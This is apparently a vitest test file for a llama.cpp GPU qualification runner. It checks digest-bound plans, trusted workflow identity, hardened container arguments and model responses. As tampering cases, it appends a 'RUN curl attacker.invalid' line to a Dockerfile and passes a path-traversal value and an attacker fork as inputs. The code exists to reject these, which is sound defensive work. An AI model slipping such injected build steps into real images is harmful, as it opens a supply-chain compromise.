// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

import { createHash } from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { describe, expect, it } from "vitest";

import { loadLlamaCppImageConfig } from "../scripts/checks/export-llama-cpp-image-config.mts";
import {
  buildCandidateImageArgv,
  buildServerContainerArgv,
  expectedRegistryName,
  expectedRegistryOwner,
  hashModelFile,
  parseNvidiaSmi,
  parseQualificationInvocation,
  type QualificationInvocation,
  type QualificationPlan,
  sha256Text,
  validateCandidateDockerfile,
  validateChatCompletionResponse,
  validateModelsResponse,
  validateOpenClawQualificationImageLabels,
  validateQualificationPlan,
  validateStartupLog,
} from "../scripts/checks/run-llama-cpp-dgx-spark-qualification.mts";

const BASE_SHA = "b".repeat(40);
const HEAD_SHA = "a".repeat(40);
const WORKFLOW_SHA = "c".repeat(40);
const RUN_ID = "42";
const RUN_ATTEMPT = "2";
const MODEL_PATH = "/var/lib/nemoclaw/models/Nemotron-3-Nano-30B-A3B-UD-Q4_K_XL.gguf";
const EXPECTED_MODEL = "nvidia-nemotron-3-nano-30b-a3b";
const repoRoot = path.resolve(import.meta.dirname, "..");
const trustedImageRoot = path.join(repoRoot, "managed-inference", "images", "llama-cpp");

const config = loadLlamaCppImageConfig();
const planSource = config.publication_qualification_plan;
const planDigest = config.publication_qualification_plan_sha256;
const plan = validateQualificationPlan(planSource, planDigest);

function trustedEnvironment(overrides: Record<string, string | undefined> = {}) {
  return {
    GITHUB_ACTOR: "trusted-maintainer",
    GITHUB_ACTOR_ID: "41898282",
    GITHUB_EVENT_NAME: "workflow_dispatch",
    GITHUB_REF: "refs/heads/main",
    GITHUB_REPOSITORY: "NVIDIA/NemoClaw",
    GITHUB_RUN_ATTEMPT: RUN_ATTEMPT,
    GITHUB_RUN_ID: RUN_ID,
    GITHUB_SHA: WORKFLOW_SHA,
    GITHUB_WORKFLOW_REF: "NVIDIA/NemoClaw/.github/workflows/e2e.yaml@refs/heads/main",
    ...overrides,
  };
}

function invocationArguments() {
  return [
    "--base-sha",
    BASE_SHA,
    "--candidate-root",
    "/work/candidate",
    "--head-sha",
    HEAD_SHA,
    "--model-host-path",
    MODEL_PATH,
    "--output",
    "/work/artifacts/evidence.json",
    "--plan",
    "/work/tmp/plan.json",
    "--plan-sha256",
    planDigest,
    "--registry-name",
    expectedRegistryName(RUN_ID, RUN_ATTEMPT),
    "--run-attempt",
    RUN_ATTEMPT,
    "--run-id",
    RUN_ID,
    "--workflow-sha",
    WORKFLOW_SHA,
  ];
}

function parsedInvocation(): QualificationInvocation {
  const invocation = parseQualificationInvocation(invocationArguments(), trustedEnvironment());
  expect(invocation).toMatchObject({ cleanupOnly: false });
  return invocation as QualificationInvocation;
}

function mutatedPlan(mutate: (value: Record<string, any>) => void): [string, string] {
  const value = JSON.parse(planSource) as Record<string, any>;
  mutate(value);
  const source = JSON.stringify(value);
  return [source, sha256Text(source)];
}

function valuesAfter(argv: string[], option: string): string[] {
  return argv.flatMap((value, index) => (argv[index - 1] === option ? [value] : []));
}

function qualificationPlanForModel(content: Buffer): QualificationPlan {
  return {
    ...plan,
    recipe: {
      ...plan.recipe,
      model: {
        ...plan.recipe.model,
        file: {
          ...plan.recipe.model.file,
          digest: `sha256:${createHash("sha256").update(content).digest("hex")}`,
          sizeBytes: content.length,
        },
      },
    },
  } as unknown as QualificationPlan;
}

describe("trusted llama.cpp DGX Spark qualification runner", () => {
  it("accepts only the canonical digest-bound declarative execution plan (#8260)", () => {
    expect(plan.contractVersion).toBe(1);
    expect(plan.recipe.id).toBe("llama-cpp.nemotron-3-nano-30b-a3b.spark-single.v1");
    expect(() => validateQualificationPlan(planSource, `sha256:${"0".repeat(64)}`)).toThrow(
      /digest mismatch/u,
    );

    const spaced = `${planSource}\n`;
    expect(() => validateQualificationPlan(spaced, sha256Text(spaced))).toThrow(/canonical/u);

    for (const mutate of [
      (value: Record<string, any>) => {
        value.untrusted = true;
      },
      (value: Record<string, any>) => {
        value.imageBuild.platform.platform = "linux/amd64";
      },
      (value: Record<string, any>) => {
        value.imageBuild.cuda.runtimeBase = "docker.io/nvidia/cuda:latest";
      },
      (value: Record<string, any>) => {
        value.recipe.runtime.gpu.cpuFallback = "allow";
      },
      (value: Record<string, any>) => {
        value.recipe.surfaces.ui = "enabled";
      },
    ]) {
      const [source, digest] = mutatedPlan(mutate);
      expect(() => validateQualificationPlan(source, digest)).toThrow();
    }
  });

  it("binds normal and cleanup invocations to the trusted workflow run (#8260)", () => {
    expect(parsedInvocation()).toEqual({
      candidateBase: BASE_SHA,
      candidateHead: HEAD_SHA,
      candidateRoot: "/work/candidate",
      cleanupOnly: false,
      modelHostPath: MODEL_PATH,
      output: "/work/artifacts/evidence.json",
      planFile: "/work/tmp/plan.json",
      planSha256: planDigest,
      registryName: expectedRegistryName(RUN_ID, RUN_ATTEMPT),
      registryOwner: expectedRegistryOwner(RUN_ID, RUN_ATTEMPT),
      runAttempt: RUN_ATTEMPT,
      runId: RUN_ID,
      workflowSha: WORKFLOW_SHA,
    });

    expect(
      parseQualificationInvocation(
        invocationArguments(),
        trustedEnvironment({
          GITHUB_ACTOR: "merge-queue[bot]",
          GITHUB_ACTOR_ID: "12345",
          GITHUB_EVENT_NAME: "push",
        }),
      ),
    ).toMatchObject({ cleanupOnly: false, workflowSha: WORKFLOW_SHA });

    expect(
      parseQualificationInvocation(
        [
          "--cleanup-only",
          "--registry-name",
          expectedRegistryName(RUN_ID, RUN_ATTEMPT),
          "--run-attempt",
          RUN_ATTEMPT,
          "--run-id",
          RUN_ID,
        ],
        trustedEnvironment(),
      ),
    ).toEqual({
      cleanupOnly: true,
      registryName: expectedRegistryName(RUN_ID, RUN_ATTEMPT),
      registryOwner: expectedRegistryOwner(RUN_ID, RUN_ATTEMPT),
      runAttempt: RUN_ATTEMPT,
      runId: RUN_ID,
    });
  });

  it("rejects hostile CLI fields, paths, ownership, and workflow identity (#8260)", () => {
    const unknown = [...invocationArguments(), "--extra", "value"];
    expect(() => parseQualificationInvocation(unknown, trustedEnvironment())).toThrow();

    const duplicate = [...invocationArguments(), "--run-id", RUN_ID];
    expect(() => parseQualificationInvocation(duplicate, trustedEnvironment())).toThrow();

    const traversal = invocationArguments();
    traversal[traversal.indexOf("--candidate-root") + 1] = "/work/../candidate";
    expect(() => parseQualificationInvocation(traversal, trustedEnvironment())).toThrow();

    const wrongRegistry = invocationArguments();
    wrongRegistry[wrongRegistry.indexOf("--registry-name") + 1] = "nemoclaw-llama-cpp-999-1";
    expect(() => parseQualificationInvocation(wrongRegistry, trustedEnvironment())).toThrow();

    for (const environment of [
      trustedEnvironment({ GITHUB_REPOSITORY: "attacker/fork" }),
      trustedEnvironment({ GITHUB_REF: "refs/pull/1/merge" }),
      trustedEnvironment({ GITHUB_EVENT_NAME: "pull_request_target" }),
      trustedEnvironment({ GITHUB_ACTOR: "untrusted user" }),
      trustedEnvironment({ GITHUB_ACTOR_ID: "0" }),
      trustedEnvironment({ GITHUB_RUN_ATTEMPT: "3" }),
      trustedEnvironment({ GITHUB_RUN_ID: "43" }),
      trustedEnvironment({ GITHUB_SHA: HEAD_SHA }),
      trustedEnvironment({
        GITHUB_WORKFLOW_REF: "NVIDIA/NemoClaw/.github/workflows/e2e.yaml@refs/heads/feature",
      }),
    ]) {
      expect(() => parseQualificationInvocation(invocationArguments(), environment)).toThrow();
    }
  });

  it("builds the exact ARM64 candidate plan from the trusted image context (#8260)", () => {
    const argv = buildCandidateImageArgv(plan, parsedInvocation(), "/work/tmp/metadata.json");
    expect(valuesAfter(argv, "--platform")).toEqual(["linux/arm64"]);
    expect(valuesAfter(argv, "--tag")).toEqual([
      `localhost:5000/nemoclaw-llama-cpp-dgx-spark/llama-cpp-server:${HEAD_SHA}`,
    ]);
    expect(argv).toContain("--push");
    expect(argv).not.toContain("--load");
    expect(valuesAfter(argv, "--file")).toEqual([path.join(trustedImageRoot, "Dockerfile")]);
    expect(argv.at(-1)).toBe(trustedImageRoot);
    expect(argv).not.toContain("/work/candidate");
    expect(valuesAfter(argv, "--build-arg")).toEqual(
      expect.arrayContaining([
        "CUDA_ARCHITECTURES=121a-real",
        `CUDA_DEV_IMAGE=${plan.imageBuild.cuda.developmentBase}`,
        `CUDA_RUNTIME_IMAGE=${plan.imageBuild.cuda.runtimeBase}`,
        `LLAMA_CPP_ARCHIVE_SHA256=${plan.imageBuild.source.archiveSha256}`,
        `LLAMA_CPP_REVISION=${plan.imageBuild.source.revision}`,
        `NEMOCLAW_REVISION=${HEAD_SHA}`,
        "TARGETPLATFORM=linux/arm64",
      ]),
    );
  });

  it("requires the candidate Dockerfile to byte-match trusted main (#8260)", () => {
    const candidateRoot = fs.realpathSync(
      fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-llama-cpp-candidate-")),
    );
    const candidateImageRoot = path.join(candidateRoot, "managed-inference", "images", "llama-cpp");
    fs.mkdirSync(candidateImageRoot, { recursive: true });
    fs.copyFileSync(
      path.join(trustedImageRoot, "Dockerfile"),
      path.join(candidateImageRoot, "Dockerfile"),
    );
    try {
      expect(() => validateCandidateDockerfile(candidateRoot)).not.toThrow();
      fs.appendFileSync(
        path.join(candidateImageRoot, "Dockerfile"),
        "\nRUN curl attacker.invalid\n",
      );
      expect(() => validateCandidateDockerfile(candidateRoot)).toThrow(/byte-match/u);
    } finally {
      fs.rmSync(candidateRoot, { force: true, recursive: true });
    }
  });

  it("constructs a read-only bounded one-GPU server without putting the key on argv (#8260)", () => {
    const content = Buffer.from("qualification model fixture\n", "utf8");
    const testPlan = qualificationPlanForModel(content);
    const modelRoot = fs.realpathSync(
      fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-qualification-model-")),
    );
    const modelHostPath = path.join(modelRoot, testPlan.recipe.model.file.path);
    fs.writeFileSync(modelHostPath, content);
    try {
      const model = hashModelFile(modelHostPath, testPlan);
      const modelStatus = fs.lstatSync(modelHostPath, { bigint: true });
      expect(model.filesystemIdentity).toEqual({
        ctimeNs: modelStatus.ctimeNs,
        dev: modelStatus.dev,
        ino: modelStatus.ino,
        mtimeNs: modelStatus.mtimeNs,
        size: modelStatus.size,
      });
      const argv = buildServerContainerArgv(testPlan, {
        apiKeyHostPath: "/work/tmp/api-key",
        containerName: "qualified-server",
        imageReference: `localhost:5000/repo@sha256:${"d".repeat(64)}`,
        model,
        networkName: "qualified-internal",
        registryOwner: expectedRegistryOwner(RUN_ID, RUN_ATTEMPT),
        runtimeGid: 1001,
        runtimeUid: 1001,
      });
      expect(argv).toEqual(
        expect.arrayContaining([
          "--read-only",
          "--cap-drop",
          "ALL",
          "no-new-privileges=true",
          "--gpus",
          "1",
          "--gpu-layers",
          "all",
          "--ctx-size",
          String(testPlan.recipe.serve.contextSize),
          "--batch-size",
          String(testPlan.recipe.serve.batchSize),
          "--ubatch-size",
          String(testPlan.recipe.serve.microBatchSize),
          "--cache-type-k",
          testPlan.recipe.serve.kvCache.key,
          "--cache-type-v",
          testPlan.recipe.serve.kvCache.value,
          "--flash-attn",
          "on",
          "--metrics",
          "--no-ui",
          "--no-slots",
          "--no-mmproj",
          "--no-agent",
        ]),
      );
      expect(valuesAfter(argv, "--publish")).toEqual(["127.0.0.1::8081"]);
      const agentQualificationArgv = buildServerContainerArgv(testPlan, {
        apiKeyHostPath: "/work/tmp/api-key",
        containerName: "qualified-server",
        hostPort: 8081,
        imageReference: `localhost:5000/repo@sha256:${"d".repeat(64)}`,
        model,
        networkName: "qualified-internal",
        registryOwner: expectedRegistryOwner(RUN_ID, RUN_ATTEMPT),
        runtimeGid: 1001,
        runtimeUid: 1001,
      });
      expect(valuesAfter(agentQualificationArgv, "--publish")).toEqual(["127.0.0.1:8081:8081"]);
      expect(valuesAfter(argv, "--network")).toEqual(["qualified-internal"]);
      expect(valuesAfter(argv, "--user")).toEqual(["1001:1001"]);
      expect(valuesAfter(argv, "--api-key-file")).toEqual(["/run/secrets/llama-cpp-api-key"]);
      expect(argv).not.toContain("--api-key");
      expect(valuesAfter(argv, "--mount")).toEqual([
        `type=bind,source=${modelHostPath},target=/models/${testPlan.recipe.model.file.path},readonly`,
        "type=bind,source=/work/tmp/api-key,target=/run/secrets/llama-cpp-api-key,readonly",
      ]);
      expect(valuesAfter(argv, "--memory")).toEqual([
        `${testPlan.recipe.runtime.resources.memoryBytes}b`,
      ]);
      expect(valuesAfter(argv, "--memory-swap")).toEqual([
        `${testPlan.recipe.runtime.resources.memoryBytes}b`,
      ]);
      expect(valuesAfter(argv, "--pids-limit")).toEqual([
        String(testPlan.recipe.runtime.resources.pidsLimit),
      ]);
      expect(valuesAfter(argv, "--tmpfs")).toEqual([
        `/tmp:rw,noexec,nosuid,nodev,size=${testPlan.recipe.runtime.resources.writableStorageBytes},uid=1001,gid=1001,mode=1777`,
      ]);
      expect(() =>
        buildServerContainerArgv(testPlan, {
          apiKeyHostPath: "/work/tmp/api-key",
          containerName: "qualified-server",
          imageReference: `localhost:5000/repo@sha256:${"d".repeat(64)}`,
          model,
          networkName: "qualified-internal",
          registryOwner: expectedRegistryOwner(RUN_ID, RUN_ATTEMPT),
          runtimeGid: 1001,
          runtimeUid: 0,
        }),
      ).toThrow(/runtime uid/u);
    } finally {
      fs.rmSync(modelRoot, { force: true, recursive: true });
    }
  });

  it("accepts only the exact NVIDIA OpenClaw ARM64 managed-image labels", () => {
    const labels = {
      "io.nvidia.nemoclaw.agent": "openclaw",
      "io.nvidia.nemoclaw.managed-image.contract": "1",
      "io.nvidia.nemoclaw.managed-image.platform": "linux/arm64",
      "org.opencontainers.image.revision": "eb1d2f5700393892f227ac9fd56f485fc6718bce",
      "org.opencontainers.image.source": "https://github.com/NVIDIA/NemoClaw",
    };
    expect(() =>
      validateOpenClawQualificationImageLabels(
        JSON.stringify(labels),
        "eb1d2f5700393892f227ac9fd56f485fc6718bce",
      ),
    ).not.toThrow();
    expect(() =>
      validateOpenClawQualificationImageLabels(
        JSON.stringify({ ...labels, "io.nvidia.nemoclaw.agent": "hermes" }),
        "eb1d2f5700393892f227ac9fd56f485fc6718bce",
      ),
    ).toThrow(/declarative identity/u);
    expect(() =>
      validateOpenClawQualificationImageLabels(JSON.stringify(labels), "f".repeat(40)),
    ).toThrow(/declarative identity/u);
    expect(() => validateOpenClawQualificationImageLabels("{", "f".repeat(40))).toThrow(
      /labels are invalid/u,
    );
  });

  it("requires unambiguous full GPU offload and rejects CPU fallback warnings (#8260)", () => {
    expect(validateStartupLog("llama_model_loader: offloaded 57/57 layers to GPU\n")).toEqual({
      offloadedLayers: 57,
      totalLayers: 57,
    });
    for (const log of [
      "llama_model_loader: offloaded 56/57 layers to GPU",
      "warning: no usable GPU found, --gpu-layers option will be ignored",
      "CPU fallback enabled\noffloaded 57/57 layers to GPU",
      "server is listening",
      "offloaded 57/57 layers to GPU\noffloaded 58/58 layers to GPU",
    ]) {
      expect(() => validateStartupLog(log)).toThrow();
    }
  });

  it("accepts only one NVIDIA GB10 at or above the declarative driver floor (#8260)", () => {
    expect(parseNvidiaSmi("NVIDIA GB10, 580.65.06\n", "580.65.06")).toEqual({
      count: 1,
      driverVersion: "580.65.06",
      name: "NVIDIA GB10",
    });
    for (const output of [
      "NVIDIA GB10, 580.65.05",
      "NVIDIA H100 80GB HBM3, 580.65.06",
      "NVIDIA GB10, 580.65.06\nNVIDIA GB10, 580.65.06",
    ]) {
      expect(() => parseNvidiaSmi(output, "580.65.06")).toThrow();
    }
  });

  it("validates exact served-model and authenticated completion response shapes (#8260)", () => {
    expect(() =>
      validateModelsResponse({ data: [{ id: EXPECTED_MODEL }], object: "list" }, EXPECTED_MODEL),
    ).not.toThrow();
    expect(() =>
      validateModelsResponse(
        {
          data: [{ id: EXPECTED_MODEL }, { id: "unexpected" }],
          object: "list",
        },
        EXPECTED_MODEL,
      ),
    ).toThrow();

    expect(() =>
      validateChatCompletionResponse(
        {
          choices: [{ message: { content: "ready", role: "assistant" } }],
          model: EXPECTED_MODEL,
          object: "chat.completion",
        },
        EXPECTED_MODEL,
      ),
    ).not.toThrow();
    expect(() =>
      validateChatCompletionResponse(
        {
          choices: [{ message: { content: "ready", role: "assistant" } }],
          model: "unexpected",
          object: "chat.completion",
        },
        EXPECTED_MODEL,
      ),
    ).toThrow();
  });
});
